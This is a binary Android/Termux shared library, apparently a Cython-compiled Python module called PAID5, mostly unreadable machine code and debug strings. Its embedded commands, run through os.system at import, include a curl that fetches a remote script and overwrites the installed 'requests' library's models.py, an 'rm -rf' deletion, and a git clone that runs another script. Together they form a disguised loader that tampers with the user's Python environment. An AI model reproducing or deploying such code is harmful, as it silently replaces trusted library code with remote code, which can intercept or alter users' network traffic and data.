ELF�@(�@8
@ @@@00, , , ,0,0��:ZZ���?�o�o���;�[�[��R�td:ZZ�P�tdPPPllQ�tdppp���Androidr25b8937393Tew�������2IUhv�������)Rcz������� />Xiw��������)?M/8p;xq@8pG
�078p_c
g=��=�qX��|BE��Tȍ�/��BB-%#(;5,=*A8/@"<!$7>+4? :'63
 &
)190.2__cxa_finalize__cxa_atexit__register_atfork__bss_start_end_edataPyInit_PAID5PyModuleDef_InitPyThreadState_GetPyInterpreterState_GetIDPyExc_ImportErrorPyErr_SetStringPyObject_GetAttrStringPyModule_NewObject_Py_DeallocPyModule_GetDictPyDict_SetItemString_Py_NoneStructPyExc_AttributeErrorPyErr_ExceptionMatchesPyErr_ClearPyExc_RuntimeErrorPy_GetVersionPyOS_snprintfPyErr_WarnExPyTuple_NewPyBytes_FromStringAndSizePyUnicode_FromStringAndSizePyImport_AddModulePyObject_SetAttrStringPyUnicode_InternFromStringPyUnicode_DecodePyObject_Hash__pyx_module_is_main_PAID5PyObject_SetAttrPyImport_GetModuleDictPyDict_GetItemStringPyTuple_PackPyList_NewPyDict_NewPyImport_ImportModuleLevelObjectPyErr_Fetch_PyObject_GetDictPtr_Py_FalseStruct_Py_TrueStructPyObject_NotPyErr_OccurredPyDict_SetItem_PyDict_GetItem_KnownHashPyObject_GetAttrPyErr_RestorePyUnicode_FromFormatPyUnicode_AsUTF8PyCode_NewEmptyPyFrame_NewPyTraceBack_HerePyMem_ReallocPyMem_Malloc__stack_chk_failPyExc_NameErrorPyErr_FormatPy_EnterRecursiveCallPy_LeaveRecursiveCallPyObject_CallPyExc_SystemErrorlibc.soLIBC/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/liblibandroid-support.solibpython3.11.so.1.0ZZZ8qZ0Z@q8Z$XZHq`Z7�ZPq�Z��Z`p�Z�Z�p�Z �Z�p[) [�p([2H[XqP[5p[�px[@�[0q�[G�[D0�[,0�o�o@p�opp�0p�3�]�]�]�]�]'�](�]7�]<�]A�]^^^^ ^(^0^ 8^
@^H^P^
X^`^h^p^x^�^�^�^�^�^�^�^�^�^�^�^ �^!�^"�^#�^$�^%_&_)_*_+ _,(_-0_.8_/@_0H_1P_2X_3`_4h_5p_6x_8�_9�_:�_;origin/data/data/com.termux/files/home/PAID5.ccompiletime version %s of module '%.100s' does not match runtime version %sbuiltinsname__path__name '%U' is not definedloader%d.%dModule 'PAID5' has already been imported. Re-initialisation is not supported. while calling a Python objectsubmodule_search_locations__builtins__init PAID5__package____file__Interpreter change detected - this module can only be loaded into one interpreter per process.NULL result without error in PyObject_Call%s (%s:%d)parentcython_runtime__loader__PAID5.pyPAID5cd PAID5 && python X.pycline_in_tracebackcurl https://raw.githubusercontent.com/ARY.../nothing-/main/26.py > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.pygit clone https://github.com/RIAZ-143/PAID5 && cd PAID5 && python X.py__import____main____name__osrm -rf axbsystem__test__;l���������,<H0p�l'��' |(xzR|L4DL4d$| �$�\�(D@P@�������
@P�������D
�@P�������D`@P�������L$��D�\`�����
�������
X�\������������D<t�%�D H ����
p H����Dl H����T��%�D0L0�����
�
@0L������D
L0L������DD0L������\�%�D0L0����
�
D0L�����D
L0L�����D
P0L�����D`0L�����_$� �`N�_$��_�_$����_$�`�����_�_$�����0�B(��_$� ��K� �@���{�����W��O�������@���(� @�?�@T?�`T�����!-��F�@������`T(�=@���h@��h�k����!t)������������@�����aT������������������!*���p� �������!�/�����y��@��*���aT��j��7����!`'���]� 
�������!�,�����f��@��*���aT��W���7����!p/���J�  �������!�,�����S��@��*���aT��D�W
�7����!�+���7� �����F��T����!�)�����<��*�@���TU�6<�*�@���A��T��&���7���OC��WB��@��{Ĩ�_���F�@�'� 4)�����!`'���
� �����F�@���4�����!p/���� �����F�@��`4�����!�+����� �����F�@��4����OC��WB��@��{Ĩ�_�h@��h�aT���������OC��WB��@��{Ĩ�_��C��{��o��g��_��W��O����W�;�8��@�����?@�h��T�����!H*��F�@������������B0*��C���Rc�Rd�R���C@99��4i@9?k�T�G@9h4i@9?k!T�K@94i
@9?k�T�O@9�4i@9?k�TX�*���(�RH�Rh�Rhjh8�Q)qb T�39��h@9�qaT��R�#9j@9_�q@T)�RK�Q)1�T- �Q?)1CT�#9j@9_�qT��R�'9j
@9_�q T)�R�*K�Q)1cT�'9j
@9_�q!T�q�T��R�+9h@9�qTH�Q)1�T�+9h@9�q�T�5��R �Q?)1CT�/9����B (� ��1�P�c��C��#��Rt��c���"�R3�Rs� �7��t�(�A��@������)���q�(�E�`@������)���n�(�I��?�3�s����t��@����?�`�?�@�������P)�_�(�Q�@>�@��������/�V� W��=�@�����!h,���`@�b@�P���7Д�(��"@9�&@9(*h4�*@9H4�_�I���^����^�@���l�"��0���^����^�@���c����_��"���8���^����^�@��W!���^����^�@� 
�/��� T�
@����H�����F�@��4a�C�`@�'��7)��:� ��!�P��(���?@� �!!�P�����C�74���� �R3�R�6@���� 3�4���� �R3�R�2@���� 2�4��B� �R3�R�"@���� 1�4���� �R3�R�
@���� 0�:���Tc@��`"���?@���������������������*����=ƀR3�R�ŀR3�Rտ�R?@���:�HO@��X���(W@����=��c��C��#��� W@����*���@�(� @��@�?��-T(��@�:���F��`:T��F��:T���95��� U������!�,��F�@�d���ƀR3�R���������h@��h�aT��b����@���aT��[�4�5��b����@��@�����7�@���aT��M��@��@�
@�?��'T(�i@�)��@�����@�6���I@��n@�('�?��� '��@���aT��3�(���q@���'�h@����h��T�@����T�@��*@�
@�?�!T(�y@�4&��@�����@����n@�I@�h$�?���`$��@���aT���(���}@���@$�h@����h�@T�@����T�@��6@�
@�?��T(��@�t#��@�����@����n@�I@��!�?����!��@���aT����(����@����!�h@����h��T�@��� 
T�@��B@�
@�?�a
T(��@�� ��@�����@����n@�I@���?������@���aT����(����@�Y���h@����h��
T�@����
T�����@��N@�����
�7�@����:T����ʀR3�R���ʀRK�����@���a��T�����@��*@�
@�?� ��T(������@C��������@������T�����@��6@�
@�?���T(�����@�D������s��@���!��T��m��@��B@�
@�?����T(����a�@F������_��@������T��Y���@����ӀR3�R���5ԀR3�R�@���A��T��L����U��R3�R���u��R3�R������R3�R���ŀR3�R���UŀR3�R����ŀR3�R���UȀR���)�)�� @�!M@�@�I@�(�?��� ������ �q�F�)�F��@�9��H���aT�������F�?���Tm9�9�!@�"@��� ��@�
@�(�����[5ǀR3�Ro��(����!�@A��� w��� ���ÙRS�R���@c@�W��� ���̀RS�R[�����̀RS�R3f�������u΀Rs�R���@c@�F������5΀Rs�RJ�����΀Rs�R"U�������uЀR��R���@c@�5�������5ЀR��R9�����ЀR��RD���`���UҀR��Rz��@c@�$�������ҀR��R(�����ҀR��R @���)� ���Tn��uǀR3�R��+��� ���������@�M@�B�F����*�A��@�!��q�y�Z�Y4��@��ik@�+q�T
Q+�J @�_k�T�c��C��#����
4����D/�����!�,�����B|'��*
��������������/��* ��@�������T��~�D�4�*!��*�
k
Tj
K_qJ����N}|��
*�in��k���T
TM�*��� @��*�kJ��_ k*��T �*�) @�?k���TI}@�)�|�ii��@����BO@����������������*����@���aT��I�t��@����
T��B�l�����/�����!�,��*�����
��A��@������4��@���hk@� qDT
P)��*J @�_k�T�4�*
 ��
*�k
T,K�q���v��~|��*Lil��k���T
T�� *���@��*�k֦��k�T �6�) @�?k�T �)q@� kAT�|������� �)��(@� ��< �k�T
}@��~@��(�`�<lA�J�_ �`�=��L��T�~@�  �9 �5�hk�����@����aT�����@���@���AT���@���@���AT���@�����?@���?�@���AT��?@����Z�@��_� �!T�OT��WS��_R��gQ��oP��{O��C��_���RQ�������� �R*�R�� �
���W���~@� �|�hi�h)� @�)� �A��T����O��>��{���O��������Q@� @���)I@� � ?�������OA��{¨�_����@��������!�)����F�@�&����OA��{¨�_��{���W��O�������������N@�b@����N@���
@����@����OB��WA��{è�_��������OB��WA��{è������OB��WA��{è�_��{�����O���@�����A@�5������+����5�������?����������OB��@��{è�_��������OB��@��{è����������OB��@��{è�_������!�.��F�@�(������OB��@��{è�_��{����F��7� � � � ���F��7� ��G�8� ��G�"8� ��
G�B8� ��G�b8� ��G��8� ��G��8� ��G��8� ��G��8� ��"G�9� ��&G�"9� ��*G�B9� ��.G�b9� ��2G��9� ��6G��9� ��:G��9� ��>G��9� ��BG�:� ��FG�":� ��JG�B:� ��NG�b:� ��RG��:� ��VG��:� ��ZG��:� ��^G��:� ��bG�;� ��fG�";� ��jG�B;� ��nG�b;� ��rG��;� ��vG��;� ��zG��;� ��~G��;� ���G�<� ���G�"<� ���G�B<� ���G�b<� ���G��<� ���G��<� ���G��<� ���G��<� ���G�=� ���G�"=� ���G�B=� ���G�b=� ���G��=� ���G��=� ���G��=� ���G��=� ���G�>� ���G�">� ���G�B>� ��G   l�_���oP� ���o���](
'���o� 
�[���o8 ���o� ���o�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F�F��������Android (8490178, based on r450784d) clang version 14.0.6 (https://android.googlesource.com/toolchain/llvm-project 4c603efb0cca074e9238af8b4106c30add4418f6)Linker: LLD 15.0.6clang version 15.0.6$P$�d�4�P�L�d��P�$�0��4cL�c8\PdpP��P��e��e��P��eeL�e� dLxd� eLxe� �Lx���Q�� gLx���P� fLXP f$ldd�d$led�e$l�d��,4QltQ4X�Xlgt��4<P<lft�PXlfp�d��dp�e��ep�����x�Q��Q�����g�����P��f��P��f��d��d��ee��e�4�����Q��Q����e�4e����P�4d��P�d4d4dPdPdPD�P�DTd �
�P��
�
d�
�
�P����P�hT� �
��
�
e�
�
����hT0� �
0��
�
0���0���0�hT� �
��
�
c�
�
����hT0� � 0�� $
c$
|
0�|
�
c�
0�\c\�0���c�T0�T\c\�0���c��0���c�D
0�D
L
cL
�
0��
�
0���0���c��0���c�0�c00�0<c@H0�HTcXt0�t�c��0���c��0���c��0�hT0� \ 0�\ � d� � 0�� 
0�

P
4
d4
`
0��
�
0��
�
P�
�
d�
�
0�4D0�DPPPldl�0���0���P�d0�P@dLtdt�0���d��0��
d
D
0�D
d
dd
h
0�h
x
Px
�
d�
�
0���0���0���d��P 0� 0d0@PXd0�dtdt�P��0���d��P��0���@��chc�����������$�$,�,4�48�Pd�d����������������������4���\�\t�t�Y�������(YT��h���(�4DPDdc�0�8e�0�P8f�40�48d��0���P�8c��8��80�( \ 0��4d�8c( \ ch�0��
�0��X0�d�e��0��e00��,eh�0��
�0��|0�|�d�p0��,0�t�d�
�d�|d�ld�,dx���
����$Px���
����$Qx���
��� � $R��P��f�
�
Pd�f��P8dix�P� � X��X� � Q��Q
$
cTlc$
4
d\�dd
p
Xl
x
Q�Q�
�
c��c�
�
d��dXQ@DQP\c�
c\ld�(
d��X��Q��Q��cD
\
c�dL
l
d��$e$�e�Xe��e0e�
P��P�
Q��QXLf��f8Lf4\i�XiD\������Z$Z$,�D\�����$]$,�D\i�4iD\X�4XD\Y�4YH\[��[��_�4[\�������P4�4LP\�������QP�PhP\�������Rl�lpd��P��Q,Pl�0���P��f��0�0fl�0���e��0�00�l�e��e0e��f4XZ�P��P�$P�e�,e�i�,i,�,8fHlflt�,�,l[lt�,Y,4]4|Y|�f,f��l��X��Z�XtxP(X(X0DPDpcpx�P�x�c���P�L`Xx|XPXYdpd��d��P�c�P� c ,�P�,4c4@�P���Q�e�Q�$e$,�Q�,8e8@�Q���R�d�R� d ,�R�,4d4@�R��P@XPX�c���P���c���P���P�@\Q\�d���Q���d���Q���d���Q��d�Q�@0�`�e��e��e�e��c��c��c%4I?:;$>4I:;I!I7$>4I:; :;
I:;8I:;I
:;
I:;8:;&I'II'I:;I:;(
:;<I'..@�B:;'I:;I4:;I
:; 1XYW!41"41#$1%1UXYW&1'1XYW(
1)U*41+��1,��1-���B.���B/4I:;0:;1
I:;82:;3
I:;
84.@�B:;'I?5��1�B6.:;'I<?7.:;'I 84:;I9.:;' ::;I;.:;'I<?<.:;'<?=.:;'I<?>.:;'<??@.:;'6I A
:;B.:;'6 CD.@�B:;'6IE���BF��1�BR:o
!�0@� 8pVY� elo�� �o hJ
��K
aBL(
BM0
�nN8
�
�
O@
��PH
�T
QP
9~RX
�=S` �
1 �
(,
*B-
��.
�n/
Zc0 M�  �d
�nf
3�gy������B��
��� 
���
*�
B�
Cn� 
;n�(
L�0
�n�8
h�@
���H
B��P
8d�X
bo�`
"��h
j��p
� �x
GY��
$ d��
+ + ��
�6 ��
jA ��
D M
��
�B��
qT
��
W~��
*�
��
wn��
��
��
��
��
O�
��
G(��
�=��x��c�������n� R��(���0��8�=�@~�HZc�P�c�X�c�`�c�h�c�p�
L�x�T�1L��[�%,pm
*Bn
$noGeW��\cBs��xcc�e�S
��@c�c��i
� �
���
���
���
Z�_
�cc��"7cc_C2�@�J+c��t~j =
N9B
�9C
)9D
�9E
@9F 
UYG(
��H0
��I8
P�J@
�~KH
b�LP
�9MX
49N`
J9Oh
�9Pp
\9Qx
��R�
�S�
��T�
69V�
V9W�
�9X�
Q9Y�
>YZ�
�9[�
E9\�
x
9]�
o9^�
9_�
�9a�
b9b�
�9c�f9d5�f}9h?9iD}�Icccd^�icccc����@c�� xPl
)'m
~9n
�Bo
ZBp
��q 
 br(
��s0
1�t8
�9v@
BwH2��7ncM��Rccnm��r@cnc����@cc��l~z
�
'{
�9|
O�}����@ccc ��   cn=�D7 ��3�F Q i��
�n �
�
1
�y �
6~ @c� @� � �!P
�
�c
�n
@n
�@ 
>@$
b�(
,
0
�
,
8
�,
@
�� Hn<
}7A
c� �_
��d
@cy
��
}��
@c��
���
ccc@�x��
�
�  � 6
�B7
�8
�@9
�B;D`-8l lBM%  %(
wB
I�

C�

!B

��
 ��
�cc���
 �@cc�dM���������c�n#)�(c�ccH��M��fZ9kcc��c�cM
�.�c��� 
 �<
�@=
��>�
�� @p�
l�
� p�l+
� ]elI
� �elg
� �elI
� ��
� >el I
� ��
� 2el�
� �el�
� b�� 0p&`
C��
+C� Gel_�c�hp#y� �elN� kel�
* T�, �el�. el
�3�mr�@Au`hp#`�c`hp#hAuqhp#��cqhp#�Au�hp#��c�hp#�Au�hp#��c�hp#�9B�c�c�@d ��B� ��@O
�c
w�cU�P@��D �1$4��!��1"��1"��1"22"�2#�4$!�2!�)2 j&X6$ds& j&p6)$Ps& j&�6+$Ps&%j&�-$Ps& c2�6�0 C2�6�A&[Q2#�74�?9c'y2�7�B%�2�U&?�2&�2&��2"��2"�2"L�2"��2"b�2(�2�9 �&�9'�&�9Z  �&�9'�&�9Z %3 �&\3"�@3"EL3"�X3"�d3" p3"� |3(�3B%�3pZ&$�3";�3"��3"��3"X�3"��3)�"G�3%4��!&�4&�4"$'4%�& � &}�&%44P\&�A4"�"M4*Y4%f4��&�s4&4&��4"��4"K�4"O�4%�4�_&!�4&"�4"J!�4"�!5(5�C%�&�J$f'%�& Z &c"�& �&�CM$f' �&�CZ $f�&%5Pj &(#$5&�"05"�"<5"T$H5"�$T5 f4�B|�$Ps4$X4$i�4"^#�4"�#�4"$�4#�D("%a5 �&�D� &<%�&)�"�$o5 �&�Cd
$P' �&�CZ $P�& �&�Ce
$P' �&�CZ $P�& �&�Cf
$d' �&Bv$e' �&BZ $e�& �&0Bw$d'#�C�$�c'�&D� �&:X$d�& j&@:`$ds&%4�b&34"�'4'�&p:d%�&g&i�&%�&@h&��& j&�:q$ds&%4ps&�4"�'4'�&;u%�&�x&.�&%�&�y&d�& j&|;�$ds&%4 �&�4"�'4'�&�;�%�&`�&��&%�&��&)�& j&<�$ds&%4��&�4"_'4'�&D<�%�&�&��&%�&P�&��& �&�<�$d�& �&>�$d' �&>Z $d�& �&P@�'�&P@Z +U14+}5(4,�5H4-T;-S3-Q5-P�,�5�5-Q�-U�-S�-P�,�5�5-R1-Q�+�56+�5 6+�5<6,�1h6-P�+�5�6+�5�6+6�6+*67+�5$7+<6T7+�5p7+]6�7+o6�7+�6�7+�6�7,�1�7-P�,�68-P1,�6(8-P1,�6H8-P1,�6h8-P1+�6�8+�1�8+�6�8,�6�8-S�-R�-Q�-P�+'+�8,�69-R�-Q�-P�+7l9+(7x9+U1�9,37:-R�.Xh:,N7�:-P�.X;,N74;-P�.X�;,N7�;-P�.X<<,N7l<-P�+�6�<,37�<-R�+ 8,=+ 8|=+ 8�=+�6�=.X�>,7�>-P�+ 8@?+�8H?+�8d?+�8�?+�8�?+�8�?+�8�?+�8@+�80@+�8x@+�1�@+o6�@+W9�@,�6�@-R�-Q�-P�,n9A-S�+�9(A,�9@A-R�,�9B-Q�-P�,�9B-P�,�9hB-R�+W9|B+�9<C,�9`D-P��|
DM
�
,g
� 'Y�
 ���
 elL�
� �/�
��BlM c�hp#�c�hp# �c�hp#(�c�hp#0=c�hp#8�c�hp#@T�� Z�l�e�0(�1�_�1hB�1��1�B�1�G� 1�
G�!1�
G�"n�c�hp#��
J� Gl�
c�hp#���� $Glzc�hp#�_ �� 7Gl�� c�hp#���� �GlG�c� `p�3 � Gl�U �  Gl U � )�� � 2Gl�c�hp#��3 � 5�� � @Gl�U � G/�B�/�@�/c@��c�hp#H�c�hp#PGc�hp#X~!$ lel'c�hp#p�!p �el�!w �el+�c�hp#xc�hp#�Ec�hp#�Tc�hp#�cc�hp#�Au�hp#��c�hp#� �"�&hp�hp#�hp#��2�}1�@~1�@1�"��"#1|0y1�##z1�@{(#3#�  ��g
*g
cg
�cg 
cg(
�@g0
��$g4
�
�$g6
�@g8
�@g<
T@g@
�@gD
h@gH
�@gL
�@gP
�@gT
�@gX
w@g\
�cg`
� cgh
� cgp
rcgx
�cg�
cg�
�cg�
�cg�
�g�
�@g�
��g�
j�g��g
( ��$� �el)/�B��$�$�0
*B
�n
fu
�,% 
{A%(1%<%� F%Q%�[%f%��0H
*B�
in�
q  �
p�%� �3�T�3�
T�3uT�3�T�3�T�
��%�(�%T�J4�0o��c5/&�06v(c@&E&� 7"�@8� �9��:��c9�:�c7��@:z�c:��c:�B:� �B:�@8��@8��c9�W:�Wc�0(m@
�cz�c:��@&u��c�m�cN��c���3%P&� "�]& j&1�$cs&%�&0�&+�&%�&`� &��&&��&&P�&&�&"s�&"��&%�&�� & �&%�&�� &,�&&b�&&��&&��&"�&"U�&%�&�� &��&%�& � &��&&��&&g�&&-�&"��&"��&%�&P� &3�&%�&�� &V�&&��&&�&&��&"E�&"��& �&�28� &�& �&�3�'�&�3Z +'+�0+D1�0+U1�0,g1(1-P�+~141,�1\1-P�,g1t1-P�,�1�1-R�-P�,g1�1-P�,�1�1-R�-P�,g12-P�,�1(2-R�-P�,g1X2-P�,�1�2-R�-P�+�1�2+�1�2,g13-P�+�13+�13,g1,3-P�+�1@3+�1H3,g1X3-P�+�1l3+�1t3;8<2+7+B+� 
�hR
2+U
�2+V
L1-W
@]
�@`
@b 
�@c$
A@d(
�@i,
� @j0
�F-n8
v�/p@
7�/qH
�crP
�csX
�cv`
�cwh
�cxp
�0}x
�c�
�@��
<c��
�M
��
�M
��

@��
Fc��
�H��
���
Y@��
+c��
�c��
�c��
u��
�u��
�S0���0�(_�0Q_�8>
"0�@?K-�P6-A-* �K-V-5 &
��-1
��-3
��/4�-
;�-#
%��- �P/
=>.1
�c2
�c3
Tc4
�##5 
()/6(
��-80
,�/=8
@>@
��/?D
�e@E
�/BHC.N.�;�$
*B%
�c&
Jc&
"c& 
�c&(
c&0
�
c&8
�c&@
�c&H
�c'P
�c(X
�c)`
�c*h

c+p
�[,x
}/4�/�
AT�
)./9/�  �8
*B
X)/
��-
�c 

@(
�e,
�e-
e.
��/0cl�/�/S�/
>�/�
'-�V-�/�0@c)/@c"0-0�I Q7
_cE
CN0G-0^02"0
�## 
]{0!�0�� i(�
d@�
�@�
�@�
��0� D�
�@�
m�0�
y�0��0�-�01�P 1
 K
�?1L
L�M
�N
��/O16u$1-<�
cB=
!ccB6H
cc6cc6:@cBc6>'@c>"7�
@8K�
+
8�
@8��
B8�
@8��
@?8w�
+
8"�
72el�@��
@:�
^2�7�@@AUC7�
@AU;@�c:w�c:�c:&
�@8��c8�c8��c8��c82�cA�B�S:�SB:�S@:�T@:`TB8�U##8aV)/8�W2+8'Xc8�Xc8XcA�u@��@:��2+:��@8'�c8��c8�c8`�_8-�c?8��c7��c:��c:��c8���7�##:��@8,
�@8��##7U�@:��":��@:��@8"�@8i�@8[
�@@�##:�B:�@:�@:`B8�c8�##A�L9&�:��@:��##8��"8,
�@8�@?80
�##?87�@;�6B=d=@��BC6�@cBn67cn6?"cBn6?�cBn6Y+cB=�"@cBc="cB=[fcBnBB=�-  c=.%@ccc;t"c6�9ccB6#cnC6lcn;c6=<ccccc@<�___=$0@c;�c6^@cccD�E�mjkc`(kc�(kc�)Gkc�)�mY2*�lc+:�EEeF-Q�-P�+.:FF5:LF-Q�-P�+(7PF+U1�F<E�m�Hcc&wHc'�HP:�'�H_=(�Mc j&�ES$Ps&+(7�EF�8�E-P�=1$ccc�D�moc_%wc-&� c%4� &�%4"
&'4.Y�D+�8E,:,E-R�<�ccc=cBC=lYBc6_
�##BB@64
 )/2+##cc6� @)/6 6���6? 4��6��ccBC6)!M@B>L!N6�"�ccccu$dhl����� Ld $ld�PTXlp��������4��(,4<���8( \ h��
��p�,lpx��
��$�
L���
��048L4\�XD\�4l���0����������,����� � � � � � ��


$
T\$
4
\t`
h
l
|
��
�
�
�
���
�
���
@HHLP\��\l�
����������D
L
�L
d
DHLdx�__pyx_moduledefnb_reservednb_inplace_ortp_richcomparem_clear__pyx_dict_version__pyx_string_tab__Pyx_StringTabEntry__pyx_kp_s_curl_https_raw_githubusercontentcountco_warmup__pyx_cfilenmnextf_codepreviousgilstate_counteropaquert_from_callPyErr_WarnEx/data/data/com.termux/files/home/PAID5.cnb_rshiftnb_inplace_powermp_ass_subscriptPyCFunctionPyMemberDeftp_basedescrsetfuncinitprocunsigned intm_init__pyx_k_main__pyx_linenoPyDictObjectPy_DECREF__Pyx_copy_spec_to_module_framec_traceobjPyMem_ReallocargcharPy_ssize_tsq_lengthsetattrofuncitemsizegetdescrgetfuncm_copym_namesco_code_adaptivema_valuesinterneduse_tracingidar_endcomputed_linebadpy_linepy_codePyTraceBack_Heressize_ttp_vectorcall_offsetnb_lshiftssizeargfuncsq_inplace_repeatbufdocPyGetSetDef__Pyx_CodeObjectCacheEntryinterp_Py_CODEUNITfilenamestart__Pyx_GetBuiltinNamenb_subtractnb_intnb_floor_divideobjobjargproctraverseproc__pyx_moduledef_slotsn__pyx_k_import__pyx_k_os__pyx_k_rm_rf_axbco_consts_co_linearray_dictvaluesPyInterpreterStatef_func_opaquesizedatastack_limitpy_frame__Pyx_PyObject_Callsq_concatsetter__pyx_empty_unicodePyCodeObjectreadyf_builtinsf_trace_linesis_entry_BoolPy_tracefunc_tsattr_namePy_GetVersionPyDict_New_py_tmptp_nametp_as_sequencesq_containsPy_hash_ttp_calltp_methodstp_bases__pyx_clinenohashc_profilefuncdictPyObject_SetAttrStringPyObject_Hasham_awaitnb_xorsq_inplace_concattp_hashml_flagsslot__pyx_empty_bytesco_argcountPyDictKeysObjectprevuint8_tPyErr_ClearPyObject_SetAttrPyMem_MallocPy_LeaveRecursiveCallnb_invertPyMappingMethodsreleasebufferproc__pyx_k_testshortco_stacksize_co_coderesultf_trace_opcodes__Pyx_InitGlobals__Pyx_AddTraceback__Pyx_CLineForTracebackPyUnicode_FromFormat/data/data/com.termux/files/hometp_as_asyncnb_addnb_powerternaryfunctp_as_buffernameuint64_t__pyx_n_s_importco_nlocals__Pyx_CodeObjectCachePy_INCREFop_iscframefunc_closuref_framecurexc_typeasync_gen_finalizertopPyModule_GetDictfunctp_deallocnb_multiplynb_indexndimset__pyx_n_s_os__pyx_tuple__4__pyx_n_s_testco_namespecfunc_codefunc_weakreflist_f_frame_datadatatp__Pyx_CreateCodeObjectForTracebackPyErr_OccurredPyInit_PAID5getattrfunctp_setattrsq_ass_itemPySequenceMethodstp_strtp_getattrogetattrofunctp_flags__pyx_empty_tuple__pyx_k_curl_https_raw_githubusercontent__pyx_kp_s_git_clone_https_github_com_RIAZco_localspluskindsco_filename_dictkeysobjectcurrent_idto_nametracing_whatfunc_annotationsf_linenotrash_delete_nesting_stack_chunkexc_statePyModule_NewObjectendPyCode_NewEmptyclang version 15.0.6__kernel_long_tmp_lengthgetbufferprocbf_releasebuffertp_delm_methods__pyx_methodsis_strintern__pyx_k_cd_PAID5_python_X_py__pyx_tuple__2co_exceptiontableframe_objPyTraceInfoPyErr_ExceptionMatches__pyx_bisect_code_objects__ARRAY_SIZE_TYPE__nb_inplace_lshiftmp_subscriptgettertp_subclasses__pyx_dict_cached_value__pyx_n_s_maincode_objectco_weakreflisttracinglocalsplus_PyCFramecontext_vermessageob_basePySendResultnb_inplace_matrix_multiplysq_itemformatPyBufferProcstp_weaklistoffsettp_newfreefunctp_mrotp_vectorcallm_slots__pyx_cython_runtimefunc_moduleuint32_tf_globals_PyInterpreterFramecurexc_tracebackPyObject_GetAttrStringlevelpostmpPyFrame_New__pyx_pymod_createsetattrfuncunaryfuncPyAsyncMethodsnb_inplace_andstridesPyModuleDef_Base__pyx_f__pyx_n_s_cline_in_traceback_co_linearray_entry_sizekindfunc_defaults__Pyx_InitCachedConstants__pyx_find_code_objectmid__pyx_insert_code_objectPyBytes_FromStringAndSizePyImport_AddModulePyUnicode_AsUTF8binaryfuncnb_inplace_floor_divideinternal_typeobject__pyx_d_co_firsttraceableco_extraPyDictValuesPy_XDECREFunsigned charcodet__Pyx_Importtp_getattrPYGEN_RETURNPYGEN_NEXTnb_inplace_addnb_inplace_rshifttp_clearint64_tco_firstlinenoco_nfreevarsco_qualnamerecursion_limitcurrent_framefound_dotmodulec_linePyErr_Restoredict_versionob_refcntam_anextnb_remaindershapegetiterfunctp_dicttp_dictoffsetnewfunctp_finalize__pyx_b__pyx_tuple__3co_kwonlyargcountma_version_tagcompactfunc_versionexc_infoar_line__Pyx_InitStringsm_basenb_positivelenfuncbf_getbufferobjtp_freesize_t__int64_t__pyx_k_git_clone_https_github_com_RIAZ__pyx_k_name__pyx_n_s_systemPyThreadState_Getfunc_builtinsf_backexc_value_line_offsetsrtversionpvaluePyErr_FormatPyObject_Call__kernel_ssize_thashfunctp_iternextPyMethodDefpco_nplaincellvarsascii_staticfunc_qualnameuint16_ton_delete_dataPyDict_SetItemStringlistnew_maxPyUnicode_FromStringAndSizePyUnicode_DecodePyList_New__pyx_t_1dict_cached_valuereprfuncnb_boolwas_sq_sliceunsigned longrichcmpfuncml_nameco_namescode_linewstrthread_idPyErr_SetStringifrom_listptracebackPyTuple_PackPy_EnterRecursiveCallmoduleskwPYGEN_ERRORnb_inplace_subtracttp_as_mappingiternextfuncml_doctp_alloctp_cachem_indexm_sizem_traverse__uint64_tis_unicode__pyx_tuple_c_profileobjempty_dictempty_list__Pyx_PyObject_GetAttrStr__pyx_module_is_main_PAID5ob_typetp_itemsizetp_memberstp_initvectorcallfunclengthstatePyModuleDef_InitPyFrameObjecton_deletePyCodeAddressRangefuncnamepy_funcnameinquirynb_floatssizeobjargproctp_setattrosuboffsetstp_itertp_is_gcm_docPyModuleDef__Pyx_check_single_interpreterrecursion_headroomf_localsboundsar_startlo_nextPyInterpreterState_GetIDtstateam_aiterPy_buffertp_weaklist_object__pyx_kp_s_cd_PAID5_python_X_py__pyx_k_system__pyx_filename__pyx_n_s_name__pyx_code_cacheentriesfunc_nameprev_instrc_tracefuncprevious_item_err_stackitemcython_runtime_dictPyImport_GetModuleDictcallobjobjprocreadonlytp_docml_methallocfunctp_version_tagPyModuleDef_Slotm_freemain_interpreter_idco_ncellvarsfrom_namerecursion_remaining__uint8_tunsigned shortasync_exctrash_delete_latercoroutine_origin_tracking_depthlimitdatastack_chunkuse_cline_objPyDict_GetItemStringPyErr_Fetch__pyx_L0sq_repeattp_getsettp_descr_get__pyx_kp_s_rm_rf_axbco_flagsco_linetableallow_none_initializedasync_gen_firstiterroot_cframectversion__pyx_L1_errorPyOS_snprintf__pyx_pymod_exec_PAID5defdestructorsendfuncnb_negativenb_inplace_multiply__pyx_k_cline_in_tracebackma_keysmoddict__uint32_t_PyErr_StackItemdatastack_topsameglobal_dictptypeuse_clinePyTuple_Newtp_basicsizenb_absolutenb_ornb_true_dividetp_traversevisitprocclosurePyTypeObjectvaluemax_countco_nlocalsplusco_localsplusnamesfunc_globalsfunc_docfunc_dictvectorcallPyFunctionObjectf_fast_as_localsstacktopPyObject_NotPyObject_GetAttr__pyx_pyinit_moduleintam_sendtp_as_numbernb_inplace_xorPyNumberMethodswas_sq_ass_slicelentp_descr_setPyObjectPyASCIIObjectfunc_kwdefaultsf_tracecurexc_valuePyThreadState__Pyx__GetModuleGlobalName__pyx_t_2longob_sizePyVarObjecttp_reprnb_divmodnb_andnb_inplace_remaindernb_inplace_true_dividenb_matrix_multiply__pyx_mencodingco_posonlyargcountma_usedwchar_t__uint16_townernative_thread_idcontexttrace_info_PyStackChunk__Pyx_check_binary_versionPyUnicode_InternFromStringPyImport_ImportModuleLevelObjectPyDict_SetItemmodname�N�
